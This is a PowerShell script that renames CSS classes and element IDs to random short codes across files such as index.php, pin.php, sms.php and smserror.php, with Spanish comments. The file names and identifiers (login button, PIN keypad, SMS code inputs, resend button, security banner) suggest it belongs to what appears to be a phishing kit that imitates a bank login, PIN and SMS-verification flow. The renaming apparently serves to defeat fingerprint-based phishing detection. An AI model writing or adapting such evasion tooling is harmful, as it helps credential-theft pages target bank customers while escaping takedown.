$ErrorActionPreference = 'Stop'

$files = @(
    'index.php','index2.php','inde.php','inde.html','errror.html',
    'pin.php','pin.html','sms.php','sms.html','smserror.php'
)

# Mapping (longest first, sin colisiones)
$safeMap = [ordered]@{
    'security-banner' = 'sbF2x'
    'divider-links'   = 'dlV4k'
    'loading-overlay' = 'loZ8d'
    'bottom-shapes'   = 'bsG2q'
    'btn-ingresar'    = 'biG7r'
    'btn-reenviar'    = 'brM7t'
    'btn-validar'     = 'bvL5q'
    'resend-status'   = 'rsZ1n'
    'help-section'    = 'hsB6m'
    'code-inputs'     = 'ciR6h'
    'user-display'    = 'udH6c'
    'pin-display'     = 'pdK3z'
    'alert-error'     = 'aeM3z'
    'icon-wrap'       = 'iwK8x'
    'right-panel'     = 'rpQ7n'
    'left-panel'      = 'lpA3m'
    'login-box'       = 'lbR5j'
    'error-text'      = 'etG9k'
    'logo-wrap'       = 'lwS4p'
    'logo-slot'       = 'lsW3v'
    'id-header'       = 'ihP4j'
    'logo-img'        = 'liY4v'
    'help-img'        = 'hiC1p'
    'code-timer'      = 'ctV8b'
    'pin-dot'         = 'ptN5x'
    'container'       = 'ctW9k'
    'subtitle'        = 'stN2c'
    'spinner'         = 'spR4m'
    'welcome'         = 'wcK1p'
    'expired'         = 'exJ3w'
    'forgot'          = 'fgL9s'
    'filled'          = 'fdH9c'
    'keypad'          = 'kpL2r'
    'logout'          = 'loT6m'
    'logo'            = 'lgT8b'
    'card'            = 'crT9d'
    'hide'            = 'hdN8q'
    'show'            = 'shB1k'
    'field'           = 'flD2w'
    'empty'           = 'emA4n'

    # IDs
    'btnIngresar'    = 'bIv2k'
    'alertError'     = 'aEt6m'
    'codeForm'       = 'cFp9q'
    'codeInputs'     = 'cIw3n'
    'resendForm'     = 'rFs8x'
    'btnReenviar'    = 'bRm4j'
    'resendStatus'   = 'rSc7p'
    'codeTimer'      = 'cTr1z'
    'timerValue'     = 'tVk5b'
    'pinDisplay'     = 'pDw9h'
    'pinForm'        = 'pFy6c'
    'pinInput'       = 'pIq3r'
    'btnDelete'      = 'bDn8s'
    'loadingOverlay' = 'lOx4t'
}

foreach ($file in $files) {
    if (-not (Test-Path $file)) { continue }

    $c = [IO.File]::ReadAllText($file, [Text.Encoding]::UTF8)

    # === Risky classes (clase/CSS solamente, NO toca tags HTML/JS keys/HTML attrs) ===

    # header (clase) - no toca <header> tag
    $c = $c -creplace 'class="header"', 'class="hdR2y"'
    $c = $c -creplace 'class="header ', 'class="hdR2y '
    $c = $c -creplace ' header"', ' hdR2y"'
    $c = $c -creplace ' header ', ' hdR2y '
    $c = $c -creplace '\.header\b', '.hdR2y'

    # key (clase) - no toca e.key en JS
    $c = $c -creplace 'class="key"', 'class="kyW7s"'
    $c = $c -creplace 'class="key ', 'class="kyW7s '
    $c = $c -creplace ' key"', ' kyW7s"'
    $c = $c -creplace ' key ', ' kyW7s '
    $c = $c -creplace '\.key\b', '.kyW7s'

    # title (clase) - no toca <title> tag
    $c = $c -creplace 'class="title"', 'class="ttQ8j"'
    $c = $c -creplace '\.title\b', '.ttQ8j'

    # content (clase) - no toca content="..." attrs
    $c = $c -creplace 'class="content"', 'class="cnB1v"'
    $c = $c -creplace '\.content\b', '.cnB1v'

    # delete (clase) - no toca JS delete keyword
    $c = $c -creplace 'class="delete"', 'class="ekP9s"'
    $c = $c -creplace ' delete"', ' ekP9s"'
    $c = $c -creplace ' delete ', ' ekP9s '
    $c = $c -creplace '\.delete\b', '.ekP9s'

    # === Safe (word boundary) ===
    foreach ($k in $safeMap.Keys) {
        $v = $safeMap[$k]
        $escaped = [regex]::Escape($k)
        $c = $c -creplace "\b$escaped\b", $v
    }

    [IO.File]::WriteAllText($file, $c, (New-Object Text.UTF8Encoding($false)))
    Write-Host "OK: $file"
}
